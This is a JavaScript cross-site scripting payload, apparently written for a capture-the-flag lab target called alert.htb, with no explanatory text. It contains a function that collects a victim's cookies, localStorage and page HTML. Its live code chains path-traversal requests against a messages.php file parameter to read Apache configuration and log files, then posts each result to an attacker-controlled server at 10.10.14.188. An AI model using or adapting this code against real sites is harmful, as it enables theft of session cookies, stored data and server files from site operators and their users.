

attacker_ip =  "10.10.14.188"

base_url = "http://" + attacker_ip + ":2222/"  



// fetch("http://10.10.14.188:2221/running_stage_on_admind")

// (() => {
//    fetch("http://10.10.14.188:2221/running_stage_on_admin").then(() => {



//    })
// })()

// // Function to collect all the data
const collectData = () => {
const data = {
    cookies: document.cookie, // Retrieve all cookies
    localStorage: {}, // Retrieve localStorage key-value pairs
    htmlContent: document.documentElement.outerHTML, // Retrieve the entire HTML content
};

// Iterate over localStorage and save all key-value pairs
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
}

try {
Object.keys(localStorage).forEach(key => {
    data.localStorage[key] = localStorage.getItem(key)
})
} catch {

}

return data;
};

// Function to send data via POST
const sendDataPOST = (data) => {

fetch(base_url, {
    method: "POST",
    headers: {
        "Content-Type": "application/json", // Set content type to JSON
    },

    body: data, // Convert data to JSON
})
    .then(response => {
        if (response.ok) {
            console.log("Data successfully sent!");
        } else {
            console.error("Failed to send data:", response.statusText);
        }
    })
    .catch(error => console.error("Error during the POST request:", error));
};

// Collect data and send it
//const data = collectData();

const apacheConfigPaths = [
    // Global Configuration Files
    "/etc/apache2/apache2.conf",  // Debian, Ubuntu
    "/etc/apache2/sites-enabled/alert.conf",  // Debian, Ubuntu
    "/etc/apache2/sites-enabled/alert.htb.conf",  // Debian, Ubuntu

    // // SSL Configuration (If enabled)
     "/etc/httpd/conf.d/ssl.conf",  // CentOS, Red Hat, Fedora
    "/etc/apache2/sites-available/default-ssl.conf",  // Debian, Ubuntu

    // Access and Error Log Configuration
    "/etc/httpd/logs/access_log",  // CentOS, Red Hat, Fedora
    "/etc/httpd/logs/error_log",  // CentOS, Red Hat, Fedora
    "/var/log/apache2/access.log",  // Debian, Ubuntu
    "/var/log/apache2/error.log",  // Debian, Ubuntu

    // User and Group Configuration
     "/etc/apache2/envvars",  // Debian, Ubuntu

    // Potentially risky files for inclusion (not directories or wildcards)
     "/etc/apache2/httpd.conf",  // Potential RFI if configured with a URL include directive
     "/etc/httpd/httpd.conf",  // Potential RFI if configured with a URL include directive
];


const lfiBypassPatterns = [
    "../",         // Common relative path traversal
    // "..%2F",             // URL encoded ".." (percent-encoded)
    // "..%252F",           // Double URL-encoded (%%2F becomes %2F)
    // "%2E%2E%2F",         // URL encoding for ".."
    // "%252E%252E%252F",   // Double URL-encoding for "%2E%2E%2F"
    // "../../..//",        // Extra slashes for bypass
    // "%2E%2E%2F%2E%2E%2F", // Repeating URL encoding for ".."
    // "....//",            // Multiple dots and slashes to bypass filters
    // "../..//",            // Extra slashes after path traversal
    // "....%2F"             // Encoded forward slash
];

const sendRequests = async () => {
    for (let path of apacheConfigPaths) {
        for (let p of lfiBypassPatterns) {
            let payload = p.repeat(10) + path.slice(1);
            let payload_url = "http://alert.htb/messages.php?file=" + payload;
            
            try {
                let response = await fetch(payload_url);
                let internal_api_res = await response.text();
                
                const stolen = {
                    payload,
                    payload_url,
                    internal_api_res,
                    file_name: path
                };
                
                // Send the stolen data to the attacker server
                await fetch(`http://${attacker_ip}:2222/stolen?payload=` + payload, {
                    method: "POST",
                    body: JSON.stringify(stolen),
                    mode: "no-cors" // Suppress CORS-related errors
                });
                
                console.log("Data successfully sent to attacker server.");
            } catch (err) {
                console.error("Error during the request:", err);
            }
        }
    }
};

sendRequests();


